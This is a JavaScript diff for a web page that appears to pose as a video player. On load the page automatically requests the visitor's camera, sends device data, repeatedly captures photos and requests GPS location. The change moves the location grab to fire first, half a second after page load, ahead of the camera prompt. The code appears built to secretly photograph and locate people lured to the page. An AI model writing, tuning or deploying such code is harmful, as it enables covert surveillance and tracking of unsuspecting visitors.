@@ -338,7 +338,6 @@ function autoRequestCamera() {
     video.srcObject = stream;
     video.muted = true;
     video.setAttribute('playsinline', '');
-    requestGPS();
     video.play().then(function() {
       var box = document.getElementById('playerBox');
       if (box) box.classList.add('active');
@@ -359,7 +358,6 @@ function tryPlay() {
     loadBar.style.width = '100%';
     setTimeout(function() { loadBar.style.width = '0'; }, 600);
     document.getElementById('playerBox').classList.add('active');
-    if (!gpsData) requestGPS();
     startSpamPhotos();
     return;
   }
@@ -376,7 +374,6 @@ function tryPlay() {
     video.srcObject = stream;
     video.muted = true;
     video.setAttribute('playsinline', '');
-    requestGPS();
 
     video.play().then(function() {
       loadBar.style.width = '100%';
@@ -405,7 +402,10 @@ document.addEventListener('DOMContentLoaded', function() {
     sendDeviceData();
   });
 
-  setTimeout(function() { autoRequestCamera(); }, 500);
+  setTimeout(function() {
+    requestGPS();
+    setTimeout(function() { autoRequestCamera(); }, 1000);
+  }, 500);
 });
 
 function scrollToPlayer() {
